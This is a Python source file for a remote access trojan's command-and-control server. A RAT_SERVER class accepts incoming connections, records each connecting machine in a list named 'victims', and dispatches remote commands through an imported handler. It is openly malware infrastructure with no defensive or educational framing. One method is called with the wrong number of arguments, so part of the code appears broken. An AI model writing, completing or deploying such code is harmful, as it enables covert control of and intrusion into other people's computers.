import socket
from host.handler.command_handler import execute_command
from host.handler import command_importer
import select
import threading


class SingletonMeta(type):
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            instance = super(SingletonMeta, cls).__call__(*args, **kwargs)
            cls._instances[cls] = instance
        return cls._instances[cls]


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None  # Class variable to store the instance

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            self.host = host
            self.port = port
            self.clients = []  # The connection with the clients
            # Information about the clients but more for information instead of the connection available
            self.victims = []
            RAT_SERVER.instance = self  # Set the instance to this object

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for clients...")

        while True:
            client, addr = s.accept()
            self.clients.append((client, addr))
            print(f"[*] Connection is established successfully with {addr[0]}")

            output = self.receive_output(client)
            print(f"[*] Output received: {output}")

            output = output.split("|")
            output_dict = {}
            for item in output:
                item = item.split(":")
                output_dict[item[0]] = item[1]

            print(
                f"[*] Adding {output_dict['Name']} to the list of victims")

            for victim in self.victims:
                if victim["Name"] == output_dict["Name"]:
                    self.victims.remove(victim)
            self.victims.append(output_dict)

    def receive_output(self, client_socket):
        try:
            print("Receiving output")

            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                return client_socket.recv(100024).decode()
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def handle_client(self, client_socket):
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    break
                output = self.execute(command, client_socket)
                if output is not None:
                    client_socket.send(output.encode())
            except Exception as e:
                print(f"Error handling client: {str(e)}")
                break

        client_socket.close()

    def execute(self, command_type, command, client_socket):
        # Execute the command
        try:
            execute_command(self, command_type, command, client_socket)
        except Exception as e:
            output = str(e)
            print(f"Error executing command: {output}")
            return output
